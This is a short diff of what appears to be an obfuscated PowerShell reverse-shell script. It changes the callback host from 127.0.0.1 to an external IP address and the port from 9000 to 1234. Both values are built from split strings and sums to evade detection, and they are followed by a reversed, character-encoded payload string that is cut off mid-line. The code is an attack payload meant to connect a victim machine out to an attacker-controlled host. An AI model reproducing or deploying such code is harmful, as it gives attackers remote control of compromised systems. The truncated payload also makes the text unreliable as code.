@@ -1,8 +1,8 @@
 # change the host address and/or port number as necessary
 # obfuscated host address, same as $a = "127.0.0.1";
-$a = "127" + "." + "0" + "." + "0" + "." + "1";
+$a = "51" + "." + "38" + "." + "238" + "." + "22";
 # obfuscated port number, same as $p = 9000;
-$p = 1000 + 1000 + 1000 + 6000;
+$p = 1000 + 200 + 30 + 4;
 $3EV9  = [ChaR[ ] ]" ) )43]RAhc[,)201]RAhc[+021]RAhc[+221]RAhc[(  EcalpeRC-  421]RAhc[,)58]RAhc[+05]RAhc[+57]RAhc[(  ecAlPEr-  63]RAhc[,'geH'ecAlPEr- 69]RAhc[,'8z6'EcalpeRC-93]RAhc[,)65]RAhc[+86]RAhc[+45]RAhc[(EcalpeRC-)'
 }
 ;)()8D6TCEL8D6 + 8D6LOC8D6(::]CG.METSYS[
